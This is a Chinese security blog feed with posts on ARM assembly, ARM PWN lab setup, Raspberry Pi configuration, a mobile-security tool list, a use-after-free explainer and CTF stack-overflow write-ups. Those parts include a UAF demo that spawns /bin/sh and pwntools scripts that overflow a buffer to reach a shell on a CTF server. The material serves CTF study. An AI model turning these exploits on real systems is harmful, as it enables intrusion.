CPSR CPSR（同） R11 FP（栈帧指针） R12 IP（内部程序调用） R13 SP（栈指针） R14 LR（链接寄存器）一般存放函数返回地址 R15 PC（程序计数器） 和x86对比：\nCSPR:\n32位的CPSR寄存器的比特位含义，左边是最大比特位，右边是最小比特位。每个单元代表一个比特。\n条件码 助记符后缀 标志 含义 0000 EQ Z置位 相等 0001 NE Z清零 不相等 0010 CS C置位 无符号数大于或等于 0011 CC C清零 无符号数小于 0100 MI N置位 负数 0101 PL N清零 正数或零 0110 VS V置位 溢出 0111 VC V清零 未溢出 1000 HI C置位Z清零 无符号数大于 1001 LS C清零Z置位 无符号数小于或等于 1010 GE N等于V 带符号数大于或等于 1011 LT N不等于V 带符号数小于 1100 GT Z清零且（N等于V） 带符号数大于 1101 LE Z置位或（N不等于V） 带符号数小于或等于 1110 AL 忽略 无条件执行 程序结构 Android平台采用的是GUN ARM汇编格式，汇编器为GAS\n参数传递：R0-R3这4个寄存器用来传递函数调用的第1到4个参数，超出的参数通过堆栈来传递。R0还用来存放函数调用的返回值。\n汇编器指令 .file:源文件名\n.align:代码对齐方式\n.ascii:声明字符串\n.global:声明全局符号\n.type：指定符号的类型\n.word：存放地址值\n.size：设置指定符号的大小\n.ident：编译器标识\n寻址方式 立即寻址\nMOV R0, #1234 -\u0026gt;R0=1234\n寄存器寻址\nMOV R1 = R2 -\u0026gt;R0=R1\n寄存器移位寻址\nLSL ：逻辑左移，移位后寄存器空出的低位补0\nLSR：逻辑右移，移位后寄存器空出的高位补0\nASR：算术右移，移位过程中符号位保持不变，若源操作数为正数，则移位后空出的高位补0，否则补1。\nROR：循环右移，移位后移出的低位填入移位空出的高位。\nRRX：带扩展的循环右移，操作数右移一位，移出的空位用C标志的值填充。\nMOV R0, R1, LSL #2 -\u0026gt;R1左移两位（R1\u0026laquo;2）赋值给R0,相当于R0 = R1*4\n寄存器间接寻址\nLDR RO, [R1] -\u0026gt;将R1寄存器的数值作为地址，取出此地址中的值赋给R0寄存器\n基址寻址\n多用于查表、数组访问操作。\nLDR R0, [R1,#-4] -\u0026gt;将R1寄存器的数值减4作为地址，取出此地址的值赋给R0寄存器。\n多寄存器寻址\n一条指令最多完成16个通用寄存器值的传送。\nLDMIA R0,{R1,R2,R3,R4} -\u0026gt;LDM为数据加载指令，指令的后缀IA表示每次执行完加载操作后R0寄存器的值自增1个字，ARM指令集中，子表示的是一个32位数值。这条指令作用为：R1 = [R0],R2 = [R0+#4],R3 = [R0+#8],R4 = [R0+#12]。\n堆栈寻址\n特定的指令来完成：LDMFA/STMFA、LDMEA/STMEA、LDMFD/STMFD、LDMED/STMED。\nLDM和STM为指令前缀，表示多寄存器寻址，即一次传送多个寄存器的值。后面的后缀为指令后缀。\nSTMFD SP!, {R1-R7,LR} -\u0026gt;将R1~R7,LR入栈，多用于保存子程序的现场。\nLDMFD SP!, {R1-R7,LR} -\u0026gt;出栈，恢复现场。\n块拷贝寻址\n实现从连续地址数据从存储器的某一位置拷贝到另外一个位置，指令有：LDMIA/STMIA、LDMDA/STMDA、LDMIB/STMIB、LDMDB/STMDB。\nLDMIA R0! {R0-R3} 从R0寄存器指向的存储单元中读取3个字到R1-R3寄存器\nSTMIA R0! {R0-R3} 存储从R1-R3寄存器的内容到R0寄存器指向的存储单元\n相对寻址\n以程序计数器PC的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到操作数的有效地址。\n1 BL NEXT ····NEXT: ········ ARM和Thumb指令集 基本指令简述 MNEMONIC{S}{condition} {Rd}, Operand1, Operand2\n助记符{是否使用CPSR}{是否条件执行以及条件} {目的寄存器}, 操作符1, 操作符2\nMNEMONIC - 指令的助记符如ADD\n{S} - 可选的扩展位，如果指令后加了S，则需要依据计算结果更新CPSR寄存器中的条件跳转相关 的FLAG {condition} - 如果机器码要被条件执行，那它需要满足的条件标示 {Rd} - 存储结果的目的寄存器 Operand1 - 第一个操作数，寄存器或者是一个立即数 Operand2 - 第二个(可变的)操作数，可以是一个立即数或者寄存器或者有偏移量的寄存器 第二操作数还有如下操作：\n1 2 3 4 5 6 7 #123 - 立即数 Rx - 寄存器比如R1 Rx, ASR n - 对寄存器中的值进行算术右移n位后的值 Rx, LSL n - 对寄存器中的值进行逻辑左移n位后的值 Rx, LSR n - 对寄存器中的值进行逻辑右移n位后的值 Rx, ROR n - 对寄存器中的值进行循环右移n位后的值 Rx, RRX - 对寄存器中的值进行带扩展的循环右移1位后的值 1 2 3 4 ADD R0, R1, R2 - 将第一操作数R1的内容与第二操作数R2的内容相加，将结果存储到R0中。 ADD R0, R1, #2 - 将第一操作数R1的内容与第二操作数一个立即数相加，将结果存到R0中 MOVLE R0, #5 - 当满足条件LE(Less and Equal,小于等于0)将第二操作数立即数5移动到R0中,注意这条指令与MOVLE R0, R0, #5相同 MOV R0, R1, LSL #1 - 将第二操作数R1寄存器中的值逻辑左移1位后存入R0 内存访问相关指令 通常，LDR被用来从内存中加载数据到寄存器，STR被用作将寄存器的值存放到内存中。\n例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 .data /* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*/ var1: .word 3 /* 内存中的第一个变量 */ var2: .word 4 /* 内存中的第二个变量 */ .text /* 代码段开始 */ .global _start _start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1] @ 将R2中的值0x3存放到R1做指向的地址 bkpt adr_var1: .word var1 /* var1的地址助记符 */ adr_var2: .word var2 /* var2的地址助记符 */ 第一种偏移形式：立即数作偏移\n1 2 STR Ra, [Rb, imm] LDR Ra, [Rc, imm] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1, #2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。 str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。 ldr r3, [r1], #4 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4。 bkpt adr_var1: .word var1 adr_var2: .word var2 第二种偏移形式：寄存器作偏移\n1 2 STR Ra, [Rb, Rc] LDR Ra, [Rb, Rc] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1, r2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1=R1+R2。 ldr r3, [r1], r2 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1=R1+R2。 bx lr adr_var1: .word var1 第三种偏移形式：寄存器缩放值作偏移\n1 2 LDR Ra, [Rb, Rc, \u0026lt;shifter\u0026gt;] STR Ra, [Rb, Rc, \u0026lt;shifter\u0026gt;] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1, r2, LSL#2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。 str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2\u0026lt;\u0026lt;2。 ldr r3, [r1], r2, LSL#2 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 = R1 + R2\u0026lt;\u0026lt;2。 bkpt adr_var1: .word var1 adr_var2: .word var2 如何区分取址模式：\n如果有一个叹号!，那就是索引前置取址模式，即使用计算后的地址，之后更新基址寄存器。\n如果在外有一个寄存器，那就是索引后置取址模式，即使用原有基址寄存器重的地址，之后再更新基址寄存器\n除此之外，就都是偏移取址模式了\n关于PC相对取址的LDR指令\n有时候LDR并不仅仅被用来从内存中加载数据。还有如下这操作:\n1 2 3 4 5 6 7 8 .section .text .global _start _start: ldr r0, =jump /* 加载jump标签所在的内存位置到R0 */ ldr r1, =0x68DB00AD /* 加载立即数0x68DB00AD到R1 */ jump: ldr r2, =511 /* 加载立即数511到R2 */ bkpt 这些指令学术上被称作伪指令。\n在ARM中使用立即数的规律\n在ARM中不能像X86那样直接将立即数加载到寄存器中。因为你使用的立即数是受限的。\n立即数的值：v = n ror 2*r 有效的立即数都可以通过循环右移来得到\n1 2 3 4 5 6 7 8 9 10 #256 // 1 循环右移 24位 --\u0026gt; 256 #384 // 6 循环右移 26位 --\u0026gt; 384 #484 // 121 循环右移 30位 --\u0026gt; 484 #16384 // 1 循环右移 18位 --\u0026gt; 16384 #2030043136 // 121 循环右移 8位 --\u0026gt; 2030043136 #0x06000000 // 6 循环右移 8位 --\u0026gt; 100663296 (十六进制值0x06000000) Invalid values: #370 // 185 循环右移 31位 --\u0026gt; 31不在范围内 (0 – 30) #511 // 1 1111 1111 --\u0026gt; 比特模型不符合 #0x06010000 // 1 1000 0001.. --\u0026gt; 比特模型不符合 这样并不能一次性加载所有的32位值。不过我们可以通过以下的两个选项来解决这个问题：\n用小部分去组成更大的值。 MOV r0, #511 将511分成两部分：MOV r0, #256, and ADD r0, #255 1 2 3 4 5 6 7 .section .text .global _start _start: mov r0, #256 /* 1 ror 24 = 256, so it\u0026#39;s valid */ add r0, #255 /* 255 ror 0 = 255, valid. r0 = 256 + 255 = 511 */ ldr r1, =511 /* load 511 from the literal pool using LDR */ bkpt 计算立即数的有效值脚本：https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py\n1 2 3 4 5 6 7 azeria@labs:~$ python rotator.py Enter the value you want to check: 511 Sorry, 511 cannot be used as an immediate number and has to be split. azeria@labs:~$ python rotator.py Enter the value you want to check: 256 The number 256 can be used as a valid immediate number. 1 ror 24 --\u0026gt; 256 下面的部分指令用到在详细查，记的话脑壳痛\n跳转指令 B\nBL\nBX\nBXL\n存储器操作指令 LDM\nSTM\nPUSH\nPOP\nSWP\n数据处理 MOV\nMVN\nADD\nADC\nSUB\nRSB\nSBC\nRSC\nMUL\nMLS\nMLA\nUMULL\nUMLAL\nSMUULL\nSMLAL\nSMLAD\nSMLSD\nSDIV\nUDIV\nASR\nAND\nORR\nEOR\nBIC\nLSL\nLSR\nRRX\nROR\nCMP\nCMN\nTSL\nTEQ\n其他指令 SWI\nNOP\nMRS\nMSR\n","date":"2019-08-10T00:00:00+08:00","permalink":"https://ykiko.top/p/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%BE%85%E8%A1%A5%E5%85%85/","title":"ARM汇编基础(待补充)"},{"content":"ARM-PWN从入门到放弃0x00-环境准备 0x00 前言 学PWN也有一段时间了，x86/x86_64 下算是入了个门，平时接触ARM比较多，正好以ARM架构下再更加深入的学习PWN。\n会用的工具、环境：\n在Ubuntu 18.04/WSL2\nDocker for wsl2\n树莓派3B+\nqemu\nunicorn\nIDA\nRadare2\nGDB+gef+pwndbg+peda\npwntools\n0x01 环境安装 这里选用的有两种环境\nARM设备 树莓派\n之前618买了树莓派，派上用场了。\n把PI的官方系统换成了Ubuntu 18.04。\n安装了GCC 、gdb、gef（经测试只有gef能用），其他也没什么需要装的。\n关闭地址随机化\n1 2 3 4 5 6 7 8 sudo cat /proc/sys/kernel/randomize_va_space # 状态查看 2 # 开启中 sudo echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space bash: /proc/sys/kernel/randomize_va_space: Permission denied su echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space cat /proc/sys/kernel/randomize_va_space 0 #这就OK QEMU 模拟 (WSL2)\n安装\n1 2 3 4 #防止又出什么乱七八糟的错误和需求，尽量都装上 apt install gdb gdb-multiarch ## apt install qemu ## apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu ##gcc arm 依赖库安装 0x02 启动和调试 树莓派\n直接运行\n进行socat绑定端口 就OK\n1 socat tcp-listen:6666,fork exec:./binfile QEMU\n32bit 1 2 3 4 5 6 7 8 # 本地GDB调试 qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./binfile gdb-multiarch target remote localhost:1234 # 绑定运行到指定端口 远程调试 socat tcp-l:10002,fork exec:\u0026#34;qemu-arm -L /usr/arm-linux-gnueabi ./binfile\u0026#34;,reuseaddr \u0026amp; # + -g 方便调试 socat tcp-l:10002,fork exec:\u0026#34;qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./binfile\u0026#34;,reuseaddr \u0026amp; 64bit 1 2 3 4 # 本地调试 -g 等待GDB调试 qemu-aarch64 -g 1111 -L /usr/aarch64-linux-gnu ./file socat tcp-l:10002,fork exec:\u0026#34;qemu-aarch64 -L /usr/aarch64-linux-gnu ./binfile\u0026#34;,reuseaddr \u0026amp; socat tcp-l:10002,fork exec:\u0026#34;qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./binfile\u0026#34;,reuseaddr \u0026amp; 0x03 调试过程 在树莓派直接gdb调试就行。省略。。。\nimg\n使用qemu+gdb-multiarch+插件进行调试步骤\nqemu-aarch64 -g 10002 -L /usr/aarch64-linux-gnu ./baby_arm\n1 2 gdb-multiarch ./baby_arm -q target remote:10002 0x04 题目搭建 基于ctf_xinetd项目自己改了一个\n地址：CTF_ARM_xinetd\n0x05 参考链接 https://xz.aliyun.com/t/3154\nhttps://github.com/Eadom/ctf_xinetd\nhttps://github.com/bkerler/exploit_me\n","date":"2019-08-03T00:00:00+08:00","permalink":"https://ykiko.top/p/arm-pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%830x00-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/","title":"ARM-PWN从入门到放弃0x00-环境准备"},{"content":"Raspberry_Pi_3B+_0安装使用 Raspberry Pi 3B+ 0安装使用 0x00 购买 终于下手买了。打算用来学习ARM、以及一些硬件的知识。\n3B+ 裸机\n32G SD card\n散热片\n保护壳\n0x01 安装系统 首先下载系统镜像。\n官网有挺多系统可以选择，这里选择了安装Raspbian desktop最新版\n之后打算装Lite版，手上没有多余的显示器。而且桌面版占用很高。\n迅雷，3分钟搞定。\n其次开始向SD卡中写镜像。\n买的32G闪迪的高速卡，现在32G都白菜价了，想想几年前16G的死贵。\n官方教程用的是Etcher ，也可以用Win32DiskImager。这里省事还是用Etcher。\n步骤\n下载etcher.io安装包安装Etcher](https://etcher.io/)\n运行Etcher,选择镜像和sd卡\nFlash一键搞定。 0x02 配置 系统安装完，开始进行配置。\n先连上显示器看看\n然而平时显示器还是要连笔记本，而且这分辨率好糊。所以还是配ssh和VNC连接使用吧。\n修改源 1 2 3 4 5 6 # 编辑 `/etc/apt/sources.list` 文件，删除原文件所有内容，用以下内容取代： deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib # 编辑 `/etc/apt/sources.list.d/raspi.list` 文件，删除原文件所有内容，用以下内容取代： deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ stretch main sudo apt update\n拓展SD卡 sudo raspi-config -\u0026gt; Advanced Opt -\u0026gt; A1 Expand Filesystem\nssh 配置 最新版系统直接想要的接口打开就OK\n允许root登陆，修改/etc/ssh/sshd.conf 下的PermitRootLogin yes StrictModes yes 就ok。\nVNC win10下载vnc客户端\nRaspberryPI 命令开启server:vncserver\n连接成功：\n连接出现分辨率问题\n设置分辨率：命令sudo raspi-config-\u0026gt;Advanced Opt -\u0026gt;Resolution选择分辨率。重启就完事。\n0x04 硬件检查 系统镜像版本号 板子型号： 系统固件版本号 看看硬件：\nusb cpu 说好的v8?\n网卡 0x05 总结 闲了很久，现在终于动手搞自己想搞的东西，花了一个晚上，搞完这些简单的安装配置，挺费时费力的，不过自己开心就好。最好是自己能够坚持下去，做更多有趣的事。\n12\n","date":"2019-06-23T00:00:00+08:00","permalink":"https://ykiko.top/p/raspberry_pi_3b-_0%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/","title":"Raspberry_Pi_3B+_0安装使用"},{"content":"MobSecVM 0x00 前言 最近不知为何VM-Ubuntu炸了，试了各种方法，折腾了很久之后，终于恢复了。又浪费时间和环境斗志斗勇。自此打算自己弄一个包含了Android安全所需各种工具的环境，做个备份。防止哪天又出各种各样的问题。\n项目地址：MobSecVM\n下载地址：baiduyun、google_yun\n0x01 环境准备 Ubuntu 18.04 LTS Username：mobsec\nPassword：mobsec Vmware 15 0x02 Tools （不断补充） [x] AndroidStudio 开发全家桶带模拟器\n[x] Radare2 逆向框架\nFrida Hook工具\nDrozer Android应用程序安全评估框架\nAPKtool APK逆向工具\nBurpSuite 抓改包，安全检测\nWireshare 抓包工具\n[x] MobSF 应用程序自动化分析框架\n[] androguard 一款基于python的逆向工程，恶意软件和软件分析Android应用程序的框架。\n[x] VScode 编辑器\n[] bytecode-viewer\n[] barf–project\n[x] jadx Dex to Java decompiler\nMARA_Framework Mobile Application Reverse engineering and Analysis Framework.\nAndroBugs Framework Android vulnerability scanner\nqark Tool to look for several security related Android application vulnerabilities\nDIVA Damn Insecure and vulnerable App for Android\nInsecureBankv2 Vulnerable Android application for developers and security enthusiasts to learn about Android insecurities\nAndroid Security Sandbox An app showcase of some techniques to improve Android app security\nGoatDroid A fully functional and self-contained training environment for educating developers and testers on Android security\nsievePWN An android application which exploits sieve through android components.\n0x03 小插件 on_my_zsh\nFindBugs-IDEA\ndocker\n0x04 效果图 ","date":"2019-06-16T00:00:00+08:00","permalink":"https://ykiko.top/p/mobsecvm/","title":"MobSecVM"},{"content":"PWN-格式化字符串漏洞(FMT) 0x00 简介 ","date":"2019-04-12T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9Efmt/","title":"PWN-格式化字符串漏洞(FMT)"},{"content":"Fuzzing基础(待补充) 0x00 ","date":"2019-04-10T00:00:00+08:00","permalink":"https://ykiko.top/p/fuzzing%E5%9F%BA%E7%A1%80%E5%BE%85%E8%A1%A5%E5%85%85/","title":"Fuzzing基础(待补充)"},{"content":"CTF-PWN刷题记录-CTFWiki_3堆利用（待补充） 简介 ","date":"2019-04-04T00:00:00+08:00","permalink":"https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_3%E5%A0%86%E5%88%A9%E7%94%A8%E5%BE%85%E8%A1%A5%E5%85%85/","title":"CTF-PWN刷题记录-CTFWiki_3堆利用（待补充）"},{"content":"PWN-OOB(重写中) 0x00 简介 ","date":"2019-03-25T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn-oob%E9%87%8D%E5%86%99%E4%B8%AD/","title":"PWN-OOB(重写中)"},{"content":"CTF-PWN刷题记录-CTFWiki_2格式化字符串漏洞（待补充） 简介 ","date":"2019-03-22T00:00:00+08:00","permalink":"https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_2%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%BE%85%E8%A1%A5%E5%85%85/","title":"CTF-PWN刷题记录-CTFWiki_2格式化字符串漏洞（待补充）"},{"content":"PWN-UAF_（重写） 0x00 原理 堆内存在释放后被直接再次使用(释放了堆块之后，未将该指针值为NULL,导致指针处于悬空状态，被释放的内存能被恶意利用) 在浏览器中比较常见的漏洞\n根本原因是：\n应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。\n利用 简单利用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; typedef void (*func_ptr)(char *); void evil_fuc(char command[]) { system(command); } void echo(char content[]) { printf(\u0026#34;%s\u0026#34;,content); } int main() { func_ptr *p1=(func_ptr*)malloc(4*sizeof(int)); printf(\u0026#34;malloc addr: %p\\n\u0026#34;,p1); p1[3]=echo; p1[3](\u0026#34;hello world\\n\u0026#34;); free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针 p1[3](\u0026#34;hello again\\n\u0026#34;); //p1指针未被置空,虽然free了,但仍可使用. func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来. printf(\u0026#34;malloc addr: %p\\n\u0026#34;,p2); printf(\u0026#34;malloc addr: %p\\n\u0026#34;,p1);//p2与p1指针指向的内存为同一地址 p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针. p1[3](\u0026#34;/bin/sh\u0026#34;); return 0; } pwnable.kr uaf 先看看源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;unistd.h\u0026gt; using namespace std; class Human{ private: virtual void give_shell(){ system(\u0026#34;/bin/sh\u0026#34;); } protected: int age; string name; public: virtual void introduce(){ cout \u0026lt;\u0026lt; \u0026#34;My name is \u0026#34; \u0026lt;\u0026lt; name \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;I am \u0026#34; \u0026lt;\u0026lt; age \u0026lt;\u0026lt; \u0026#34; years old\u0026#34; \u0026lt;\u0026lt; endl; } }; class Man: public Human{ public: Man(string name, int age){ this-\u0026gt;name = name; this-\u0026gt;age = age; } virtual void introduce(){ Human::introduce(); cout \u0026lt;\u0026lt; \u0026#34;I am a nice guy!\u0026#34; \u0026lt;\u0026lt; endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-\u0026gt;name = name; this-\u0026gt;age = age; } virtual void introduce(){ Human::introduce(); cout \u0026lt;\u0026lt; \u0026#34;I am a cute girl!\u0026#34; \u0026lt;\u0026lt; endl; } }; int main(int argc, char* argv[]){ Human* m = new Man(\u0026#34;Jack\u0026#34;, 25); Human* w = new Woman(\u0026#34;Jill\u0026#34;, 21); size_t len; char* data; unsigned int op; while(1){ cout \u0026lt;\u0026lt; \u0026#34;1. use\\n2. after\\n3. free\\n\u0026#34;; cin \u0026gt;\u0026gt; op; switch(op){ case 1: m-\u0026gt;introduce(); w-\u0026gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout \u0026lt;\u0026lt; \u0026#34;your data is allocated\u0026#34; \u0026lt;\u0026lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } HCFt2016 fheap 网鼎杯CTF2018 第一场 Pwn Babyheap 参考资料：\nhttps://www.cnblogs.com/Ox9A82/p/5320857.html\nhttps://www.cnblogs.com/alert123/p/4918041.html\nhttps://blog.csdn.net/qq_31481187/article/details/73612451\nhttps://www.anquanke.com/post/id/85281\nhttps://xz.aliyun.com/t/2609?accounttraceid=ce44f2b3-4957-4509-b7ba-f2bd6eed34d3#toc-4\nhttps://www.anquanke.com/post/id/85281\n","date":"2019-03-20T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn-uaf_%E9%87%8D%E5%86%99/","title":"PWN-UAF_（重写）"},{"content":"PWN-堆溢出_(待补充) 0x00 简介 0x01 基础知识 ","date":"2019-03-16T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn-%E5%A0%86%E6%BA%A2%E5%87%BA_%E5%BE%85%E8%A1%A5%E5%85%85/","title":"PWN-堆溢出_(待补充)"},{"content":"PWN-栈溢出（待补充） 0x00 简介 0x01 基础知识 ","date":"2019-03-10T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%BE%85%E8%A1%A5%E5%85%85/","title":"PWN-栈溢出（待补充）"},{"content":"ROP练习(空) 题目列表： IP:47.106.212.155 ret2libc3\n10008\nret2shellcode\n10002\nret2libc\n10005\ntrain.cs.nctu.edu.tw: rop\n2013-PlaidCTF-ropasaurusrex\nDefcon 2015 Qualifier: R0pbaby\n10012\ntrain.cs.nctu.edu.tw: ret2libc\nAliCTF 2016：vss\nRCTF2015-welpwn\n10010\nlctf16-pwn100\n10011\nxdctf15-pwn200\n10013\nWP（持续更新）：\n","date":"2019-02-28T00:00:00+08:00","permalink":"https://ykiko.top/p/rop%E7%BB%83%E4%B9%A0%E7%A9%BA/","title":"ROP练习(空)"},{"content":"CTF-PWN刷题记录-CTFWiki_1栈溢出 看CTFWiki来入门CTF-PWN (Linux和arm) 做个记录\n知识点：PWN相关知识点总结\nLinux PWN\nARM PWN\n题目全部来源于 CTFWiki 上所涉及题目\nLinux PWN 大部分原理参考CTFWiki\n栈溢出 基本栈溢出 1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void success() { puts(\u0026#34;You Hava already controlled it.\u0026#34;); } void vulnerable() { char s[12]; gets(s); puts(s); return; } int main(int argc, char **argv) { vulnerable(); return 0; } 1 2 3 4 5 6 7 8 # gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1 stack1.c: In function ‘vulnerable’: stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration] gets(s); ^~~~ fgets /tmp/ccNeCYTO.o: In function `vulnerable\u0026#39;: stack1.c:(.text+0x45): warning: the `gets\u0026#39; function is dangerous and should not be used. echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\n关闭完全部保护\n步骤：查看gets()写入的地址距离ebp的长度（计算填充长度）-\u0026gt;+ebp的长度-\u0026gt;+返回的地址（success()的地址)\npoc1.py\n1 2 3 4 5 6 7 8 9 10 11 #coding=utf-8 from pwn import * # sh = process(\u0026#34;./stack1\u0026#34;) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10000) success_addr = 0x08048456 payload = \u0026#39;a\u0026#39;*0x14 + \u0026#39;bbbb\u0026#39; + p32(success_addr) sh.sendline(payload) sh.interactive() 基本ROP ROP 攻击一般得满足如下条件\n程序存在溢出，并且可以控制返回地址。\n可以找到满足条件的 gadgets 以及相应 gadgets 的地址。\nret2text ret2text 即控制程序执行程序本身已有的的代码 (.text)。\n示例程序：ret2text\n所以只需ret到0x0804863a就能getshell\n构造payload\n计算偏移量\n使用ragg2 ragg2 -P 200 -r \u0026gt; pattern.txt or ragg2 -P 200 -r复制下来\n1 2 # ragg2 -P 200 -r AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA# profile.rr2:\n1 2 #!/usr/bin/rarun2 stdin=./pattern.txt r2 -R profile.rr2 -d ret2text or 直接r2 -d ret2text\ndc后输入复制的pattern字符串\nwopO eip得到偏移\ngdb手动计算\n下断点call处：0x080486ae\n所以偏移为108+4\npython pattern.py\npayload\n1 2 3 4 5 6 7 8 from pwn import * # sh = process(./ret2text) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10001) binsh = 0x0804863a payload = 112*\u0026#39;A\u0026#39; + p32(binsh) sh.sendline(payload) sh.interactive() ret2shellcode ret2shellcode\n运行时shellcode所在区域应具有可执行权限 strncpy函数将gets的内容复制到buf2 